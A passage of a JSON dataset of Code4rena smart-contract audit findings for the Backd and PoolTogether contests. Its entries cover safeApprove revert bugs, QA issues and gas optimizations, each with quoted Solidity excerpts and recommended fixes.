(bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L227-L230\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #95\r\n\r\n243     function setImbalanceToleranceOut(uint256 imbalanceToleranceOut_)\r\n244         external\r\n245         onlyGovernance\r\n246         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L243-L246\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #96\r\n\r\n272     function addRewardToken(address token_) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L272\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #97\r\n\r\n290     function removeRewardToken(address token_) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L290\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #98\r\n\r\n109     function setSlippageTolerance(uint256 slippageTolerance_) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L109\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #99\r\n\r\n122     function setCurvePool(address token_, address curvePool_) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L122\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #100\r\n\r\n134     function setSwapViaUniswap(address token_, bool swapViaUniswap_)\r\n135         external\r\n136         override\r\n137         onlyGovernance\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L134-L137\r\n\r\n```solidity\r\nFile: contracts/utils/Pausable.sol   #101\r\n\r\n23     function pause() external onlyAuthorizedToPause returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Pausable.sol#L23\r\n\r\n```solidity\r\nFile: contracts/utils/Pausable.sol   #102\r\n\r\n32     function unpause() external onlyAuthorizedToPause returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Pausable.sol#L32\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #103\r\n\r\n43     function deposit(address token, uint256 amount)\r\n44         external\r\n45         payable\r\n46         override\r\n47         onlyVault\r\n48         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L43-L48\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #104\r\n\r\n72     function withdraw(address token, uint256 amount) external override onlyVault returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L72\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #105\r\n\r\n105     function deposit() external payable override onlyPoolOrMaintenance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L105\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #106\r\n\r\n118     function withdraw(uint256 amount) external override onlyPoolOrGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L118\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #107\r\n\r\n152     function withdrawAll() external override onlyPoolOrGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L152\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #108\r\n\r\n163     function withdrawFromReserve(uint256 amount) external override onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L163\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #109\r\n\r\n175     function activateStrategy() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L175\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #110\r\n\r\n183     function deactivateStrategy() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L183\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #111\r\n\r\n193     function initializeStrategy(address strategy_) external override onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L193\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #112\r\n\r\n207     function prepareNewStrategy(address newStrategy)\r\n208         external\r\n209         override\r\n210         onlyGovernance\r\n211         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L207-L211\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #113\r\n\r\n250     function resetNewStrategy() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L250\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #114\r\n\r\n259     function preparePerformanceFee(uint256 newPerformanceFee)\r\n260         external\r\n261         onlyGovernance\r\n262         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L259-L262\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #115\r\n\r\n277     function resetPerformanceFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L277\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #116\r\n\r\n286     function prepareStrategistFee(uint256 newStrategistFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L286\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #117\r\n\r\n302     function resetStrategistFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L302\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #118\r\n\r\n311     function prepareDebtLimit(uint256 newDebtLimit) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L311\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #119\r\n\r\n329     function resetDebtLimit() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L329\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #120\r\n\r\n338     function prepareTargetAllocation(uint256 newTargetAllocation)\r\n339         external\r\n340         onlyGovernance\r\n341         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L338-L341\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #121\r\n\r\n357     function resetTargetAllocation() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L357\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #122\r\n\r\n366     function prepareReserveFee(uint256 newReserveFee) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L366\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #123\r\n\r\n382     function resetReserveFee() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L382\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #124\r\n\r\n391     function prepareBound(uint256 newBound) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L391\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #125\r\n\r\n407     function resetBound() external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L407\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #126\r\n\r\n416     function withdrawFromStrategy(uint256 amount) external onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L416\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #127\r\n\r\n499     function withdrawAllFromStrategy() public onlyPoolOrGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L499\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #128\r\n\r\n509     function harvest() public onlyPoolOrMaintenance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L509",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/181"
    }
  },
  {
    "title": "Lack of `safeApprove(0)` prevents some registrations, and the changing of stakers and LP tokens",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L50\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L721\n\n\n# Vulnerability details\n\nOpenZeppelin's `safeApprove()` will revert if the account already is approved and the new `safeApprove()` is done with a non-zero value\n```solidity\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/token/ERC20/utils/SafeERC20.sol#L45-L58\n\n## Impact\nCustomers can be prevented from `register()`ing the same `token`/`stakerVaultAddress` as another customer; and once changed away from, stakers and lptokens can't be used in the future.\n\n## Proof of Concept\nThere are multiple places where `safeApprove()` is called a second time without setting the value to zero first.\n\n`register()` calls `lockFunds()` for each user registration, and since users will use the same tokens and staker vaults, the second user's `register()` call will fail:\n```solidity\nFile: backd/contracts/actions/topup/TopUpAction.sol   #1\n\n36       function lockFunds(\n37           address stakerVaultAddress,\n38           address payer,\n39           address token,\n40           uint256 lockAmount,\n41           uint256 depositAmount\n42       ) external {\n43           uint256 amountLeft = lockAmount;\n44           IStakerVault stakerVault = IStakerVault(stakerVaultAddress);\n45   \n46           // stake deposit amount\n47           if (depositAmount > 0) {\n48               depositAmount = depositAmount > amountLeft ? amountLeft : depositAmount;\n49               IERC20(token).safeTransferFrom(payer, address(this), depositAmount);\n50               IERC20(token).safeApprove(stakerVaultAddress, depositAmount);\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L36-L50\n\nThe changing of either the staker or an lp token is behind a time-lock, and once the time has passed, the changed variables rely on this function:\n```solidity\nFile: backd/contracts/pool/LiquidityPool.sol   #2\n\n717       function _approveStakerVaultSpendingLpTokens() internal {\n718           address staker_ = address(staker);\n719           address lpToken_ = address(lpToken);\n720           if (staker_ == address(0) || lpToken_ == address(0)) return;\n721           IERC20(lpToken_).safeApprove(staker_, type(uint256).max);\n722       }\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L717-L722\n\nIf a bug is found in a new `staker` or `lpToken` and the governor wishes to change back to the old one(s), the governor will have to wait for the time-lock delay only to find out that the old value(s) cause the code to revert.\n\nI've filed the other more-severe instances as a separate high-severity issue, and flagged the remaining low-severity instances in my QA report\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAlways do `safeApprove(0)` if the allowance is being changed, or use `safeIncreaseAllowance()`\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/180"
    }
  },
  {
    "title": "Customers cannot be `topUp()`ed a second time",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L71\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L120\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L53\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L847\n\n\n# Vulnerability details\n\nOpenZeppelin's `safeApprove()` will revert if the account already is approved and the new `safeApprove()` is done with a non-zero value\n```solidity\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/token/ERC20/utils/SafeERC20.sol#L45-L58\n\n## Impact\nCustomers cannot be topped up a second time, which will cause them to be liquidated even though they think they're protected\n\n## Proof of Concept\nThere are multiple places where `safeApprove()` is called a second time without setting the value to zero first. The instances below are all related to topping up.\n\nCompound-specific top-ups will fail the second time around when approving the `ctoken` again:\n```solidity\nFile: backd/contracts/actions/topup/handlers/CompoundHandler.sol   #1\n\n50       function topUp(\n51           bytes32 account,\n52           address underlying,\n53           uint256 amount,\n54           bytes memory extra\n55       ) external override returns (bool) {\n56           bool repayDebt = abi.decode(extra, (bool));\n57           CToken ctoken = cTokenRegistry.fetchCToken(underlying);\n58           uint256 initialTokens = ctoken.balanceOf(address(this));\n59   \n60           address addr = account.addr();\n61   \n62           if (repayDebt) {\n63               amount -= _repayAnyDebt(addr, underlying, amount, ctoken);\n64               if (amount == 0) return true;\n65           }\n66   \n67           uint256 err;\n68           if (underlying == address(0)) {\n69               err = ctoken.mint{value: amount}(amount);\n70           } else {\n71               IERC20(underlying).safeApprove(address(ctoken), amount);\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L50-L71\n\nCompound-specific top-ups will also fail when trying to repay debt:\n```solidity\nFile: backd/contracts/actions/topup/handlers/CompoundHandler.sol   #2\n\n62           if (repayDebt) {\n63               amount -= _repayAnyDebt(addr, underlying, amount, ctoken);\n64               if (amount == 0) return true;\n65           }\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L62-L65\n\nAave-specific top-ups will fail for the `lendingPool`:\n```solidity\nFile: backd/contracts/actions/topup/handlers/AaveHandler.sol   #3\n\n36       function topUp(\n37           bytes32 account,\n38           address underlying,\n39           uint256 amount,\n40           bytes memory extra\n41       ) external override returns (bool) {\n42           bool repayDebt = abi.decode(extra, (bool));\n43           if (underlying == address(0)) {\n44               weth.deposit{value: amount}();\n45               underlying = address(weth);\n46           }\n47   \n48           address addr = account.addr();\n49   \n50           DataTypes.ReserveData memory reserve = lendingPool.getReserveData(underlying);\n51           require(reserve.aTokenAddress != address(0), Error.UNDERLYING_NOT_SUPPORTED);\n52   \n53           IERC20(underlying).safeApprove(address(lendingPool), amount);\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L36-L53\n\nThe `TopUpAction` itself fails for the `feeHandler`:\n```solidity\nFile: backd/contracts/actions/topup/TopUpAction.sol   #4\n\n840       function _payFees(\n841           address payer,\n842           address beneficiary,\n843           uint256 feeAmount,\n844           address depositToken\n845       ) internal {\n846           address feeHandler = getFeeHandler();\n847           IERC20(depositToken).safeApprove(feeHandler, feeAmount);\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L840-L847\n\nI've filed the other less-severe instances as a separate medium-severity issue, and flagged the remaining low-severity instances in my QA report\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAlways do `safeApprove(0)` if the allowance is being changed, or use `safeIncreaseAllowance()`\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/178"
    }
  },
  {
    "title": "QA Report",
    "body": "* Consider also introducing a _MAX_DELAY in Preparable contract to avoid situations when deadline cannot be bet due to unreasonable delay.\n\n* There are TODOs left in the code. While this does not cause any direct issue, it indicates a bad smell and uncertainty and makes it harder for an auditor to make assumptions:\n```solidity\n  // TODO: add constant gas consumed for transfer and tx prologue\n  // TODO Add validation of curve pools\n  // TODO Test validation\n```\n\n* Better avoid explicit casting and use a SafeCast library, e.g.:\n```solidity\n  record.depositTokenBalance = uint128(totalLockAmount);\n  position.totalTopUpAmount -= uint128(vars.totalActionTokenAmount);\n  position.depositTokenBalance -= uint128(vars.depositAmountWithFees);\n```\n\n* SUSHISWAP is a default dex. If swapViaUniswap is not explicitly set to true for a token, then _getDex will default to _SUSHISWAP:\n```solidity\n  function _getDex(address token_) internal view returns (UniswapRouter02) {\n      return swapViaUniswap[token_] ? _UNISWAP : _SUSHISWAP;\n  }\n```\nWhile this may be an intended behavior, I think Uniswap is more widely used and supports more pairs, so it might be a good idea to default to it instead.\n\nYou may also consider a more universal approach, e.g. token to dex mapping and general adapter for each dex to support not just these 2 dexes, but have more flexibility.\n\n* function register in TopUpAction could have a max totalLockAmount parameter to let the users control the slippage especially when depositToken should be swapped to actionToken.\n\n* Tokens having more than 18 decimals are not supported, the calculation will revert here:\n```solidity\n  function _decimalMultiplier(address token_) internal view returns (uint256) {\n      return 10**(18 - IERC20Full(token_).decimals());\n  }\n```\n\n* .transfer is used for transfering ether, e.g.:\n```solidity\n        payable(to).transfer(amount);\n        payable(msg.sender).transfer(amount);\n```\nIt is currently not recommended as recipients with custom fallback functions (smart contracts) will not be able to handle that. You can read more here: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/ \n\nSolution (don't forget re-entrancy protection): https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L53-L59\n\n* In contract TopUpAction ScaledMath is used with uint128:\n```solidity\n  using ScaledMath for uint128;\n```\nScaledMath is written to support only uint256 type, so you shouldn't use it with lower types as they are automatically converted to uint256 and thus overflow/underflow might be escaped.",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/173"
    }
  },
  {
    "title": "QA Report",
    "body": "## Issue #1 (Low) - Setter function should check for Zero Address\n\nWhen setting the community reserve address, should check for an input 0 address.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L182\n\n## Issue #2 (Low) - Use of deprecated safeApprove()\nOpenZeppelin lists this function as deprecated. It is recommended to use safeIncreaseAllowance.\n\nOpenZeppelin Documentation:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/token/ERC20/utils/SafeERC20.sol#L39-L45\n\nLink to code:\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L71\n\n\n## Issue #3 (Low) - Front-runnable initializers\nLack of access control on an initialize function can be front-run, leading to redeployment.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L28-L39\n\n## Issue #4 (Low) - No transfer ownership pattern\n\nIn a couple places, transfer of an important admin address occurs without validation that the receiving address is correct. It is recommended to set the desired new address as pending until the new address is able to confirm the change. If the admin/strategist addresses are transferred incorrectly, issues will follow.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L261\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/VestedEscrow.sol#L69-L72\n\n## Issue #5 (Low) - Some tokens need to approve 0 when changing from non-zero to non-zero allowance\n\nUSDT for example will not work with the current implementation. The initial approve will succeed, but subsequent approvals will fail without resetting the approval to 0 first.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L50\n\n## Issue #6 (Low) - Require message seems incorrect\nThe require checks the access of the sender to call the function, but the require message indicates that not enough BKD has been staked.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L546\n\n## Issue #7 (Low) Register() function will succeed with 0 value maxFee\nIf the user calls `register()` with a `maxFee = 0` then the register action will fail while they send 0 ether. The action won't be able to be enacted upon, so it's simply creating waste within the protocol. This action will show up in other function calls needlessly.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L220-L222\n\n## Issue #8 (Low) - Fee on transfer tokens not supported\nIf a token with fee on transfer is used, these actions will fail. \n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L59\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L340\n\n## Issue #9 (Non-critical) - Order of params in comments doesn't match implementation\ndepositAmount and protocol are switched.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L199-L200\n\n## Issue #10 (Non-critical) - Typo in word \"Community\"\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L175\n\n## Issue #11 (Non-critical) - Typo in word \"Note\"\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L31\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/172"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Unnecessary constructor call\n\nThe `ReentrancyGuard` base contract takes no constructor arguments and can be omitted as a modifier for [`constructor`](https://github.com/pooltogether/aave-v3-yield-source/blob/3d5aeaa28b1a641187032f3780d8f663c0c9be21/contracts/AaveV3YieldSource.sol#L159-L167):\n\n\n```solidity\nconstructor(\n    IAToken _aToken,\n    IRewardsController _rewardsController,\n    IPoolAddressesProviderRegistry _poolAddressesProviderRegistry,\n    string memory _name,\n    string memory _symbol,\n    uint8 decimals_,\n    address _owner\n  ) Ownable(_owner) ERC20(_name, _symbol) ReentrancyGuard() { ... }\n```\n\nRecommendation:\n\n```solidity\nconstructor(\n    IAToken _aToken,\n    IRewardsController _rewardsController,\n    IPoolAddressesProviderRegistry _poolAddressesProviderRegistry,\n    string memory _name,\n    string memory _symbol,\n    uint8 decimals_,\n    address _owner\n  ) Ownable(_owner) ERC20(_name, _symbol) { ... }\n```\n\n### `balanceOfToken` can be declared as a `view`\n\nThe `balanceOfToken` function is read-only and can be declared as a `view`.\n\n[`AaveV3YieldSource.sol#L212`](https://github.com/pooltogether/aave-v3-yield-source/blob/3d5aeaa28b1a641187032f3780d8f663c0c9be21/contracts/AaveV3YieldSource2.sol#L212-L214):\n\n```solidity\n function balanceOfToken(address _user) external override returns (uint256) {\n    return _sharesToToken(balanceOf(_user));\n  }\n```\n\nRecommendation:\n\n```solidity\n function balanceOfToken(address _user) external view override returns (uint256) {\n    return _sharesToToken(balanceOf(_user));\n  }\n```\n\nNote that this also declared incorrectly in the `IYieldSource` interface.\n\n### Unnecessary usage of `SafeMath` library\n\nSolidity 0.8.0 introduced checked arithmetic by default, so the `SafeMath` library may safely be omitted.\n\n### Typo in natspec comment\n\n`inhereted` should read `inherited` in the natspec comment on [line 38](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L38).",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/96"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "There are multiple variables that can be immutable and their use can be \"optimized\".\n\nFirst of all, `aToken`, `rewardsController` and `poolAddressesProviderRegistry` could be immutable: there are no setters for them and all of them are proxies: in case of a change, the implementation address will change, not the proxy address.\n\nIn the case of the `poolAddressesProviderRegistry`:\n\n`poolAddressesProviderRegistry` is only needed to fetch the pool address, but there is no need to store this address, only the address of the pool (and again, is a proxy). So, there are 2 options:\n\t- Instead of passing the`poolAddressesProviderRegistry`, you can pass the `poolProviderAddress` directly and store its address as immutable.\n\t- You can pass the `poolAddressesProviderRegistry`, but only store the `poolProviderAddress` (making the call at the constructor and not in every call).\n\nSo, in `supplyTokenTo()` and `redeemToken()` there is a call to `_pool()` which calls `_poolProvider()` and `getPool()` --> 4 calls + 1 SLOAD in total. This can be done with 0 calls and 0 SLOAD just storing the pool address at the constructor.\n\n\nIn the case of  `aToken`:\n\nThe `aToken` address does not change (proxy) and its underlying wont never change. In `supplyTokenTo()` and `redeemToken()` there is a call to `_tokenAddress()` that can be skipped (1 SLOAD + 1 CALL) just storing the underlying address as immutable (doing it at the constructor; the `aToken` address can also be stored as immutable, just for transparency).\n\n\nGas comparison reducing the cost as much as possible: https://gist.github.com/miguelmtzinf/fb6d5266fb2fd3d057028b84fc0f66e1\n(also provides files with changes)\n\nThese changes reduces the gas cost across the board, and makes the most important functions way cheaper:\n- `supplyTokenTo`: 40k less\n- `redeemToken`: 40k less\n\n\n\nBonus track (not applied in the gist):\n- The function `balanceOfToken()` can be view.\n- Typo in L154. Instead of `(inhereted ERC20)`, `(inherited ERC20).\n- In `transferERC20()` at L225 you are not using the already built `_requireNotAToken()` internal function. This function could have a more generic revert message and be used also here.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/91"
    }
  },
  {
    "title": "QA Report",
